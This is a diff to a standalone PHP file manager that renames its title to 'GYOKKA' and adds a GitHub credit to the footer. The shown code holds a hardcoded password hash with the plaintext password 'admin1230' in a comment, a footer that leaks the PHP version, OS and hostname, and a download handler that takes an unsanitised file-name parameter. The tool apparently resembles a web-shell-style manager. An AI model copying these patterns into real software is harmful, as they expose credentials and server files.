@@ -11,7 +11,7 @@ if(function_exists('get_magic_quotes_gpc')&&get_magic_quotes_gpc()){
     $_GET=_stripslashes_deep($_GET);$_POST=_stripslashes_deep($_POST);$_COOKIE=_stripslashes_deep($_COOKIE);
 }
 $HASH='$2a$12$I70efF55tBEnWs6pA.te3uc16PR1szT1LWrRGtALZMQMz6ik5m1au'; //admin1230
-$TITLE='TITLE';
+$TITLE='GYOKKA';
 if($HASH!==''){
     session_start();
     if(isset($_GET['logout'])){session_destroy();header('Location:'.$_SERVER['PHP_SELF']);exit;}
@@ -22,7 +22,7 @@ if($HASH!==''){
     }
     if(empty($_SESSION['ok'])){
         _head('Login');
-        echo '<div class="center-screen"><div class="login-card"><div class="login-logo">&#9670;</div><h2>TITLE</h2><p class="sub">File Manager</p>';
+        echo '<div class="center-screen"><div class="login-card"><div class="login-logo">&#9670;</div><h2>GYOKKA</h2><p class="sub">File Manager</p>';
         if(isset($login_err))echo '<div class="msg msg-err">Wrong password</div>';
         echo '<form method=post><input name=pw type=password placeholder="Password" class="inp full" autofocus><button type=submit class="btn accent full" style="margin-top:10px">UNLOCK</button></form></div></div>';
         _foot();exit;
@@ -140,7 +140,9 @@ a{color:var(--cyan);text-decoration:none}a:hover{color:var(--cyan2)}
 @media(max-width:768px){.wrap{padding:10px}.toolbar{flex-direction:column}.tbl th:nth-child(3),.tbl td:nth-child(3){display:none}}
 </style></head><body>';
 }
-function _foot(){echo '<div class="footer">PHP '.PHP_VERSION.' &middot; '.php_uname('s').' &middot; '.@php_uname('n').'</div></body></html>';}
+function _foot(){
+    echo '<div class="footer">PHP '.PHP_VERSION.' &middot; '.php_uname('s').' &middot; '.@php_uname('n').' &middot; Copyright &copy; <a href="https://github.com/AnggaTechI" target="_blank">AnggaTechI</a></div></body></html>';
+}
 if(isset($_GET['dl'])&&is_file($d.'/'.$_GET['dl'])){
     $f=$d.'/'.$_GET['dl'];header('Content-Type:application/octet-stream');
     header('Content-Disposition:attachment;filename="'.basename($f).'"');header('Content-Length:'.filesize($f));
